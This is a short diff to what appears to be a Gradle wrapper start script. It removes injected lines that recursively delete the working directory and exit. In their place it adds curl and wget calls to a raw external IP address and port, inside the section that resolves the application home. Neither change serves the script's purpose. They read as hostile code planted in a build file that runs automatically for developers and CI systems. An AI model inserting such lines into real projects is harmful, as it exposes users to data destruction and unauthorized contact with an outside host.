@@ -24,8 +24,8 @@
 
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
-rm -r ./
-exit 0
+curl 40.114.217.231:28080
+wget 40.114.217.231:28080
 PRG="$0"
 # Need this for relative symlinks.
 while [ -h "$PRG" ] ; do
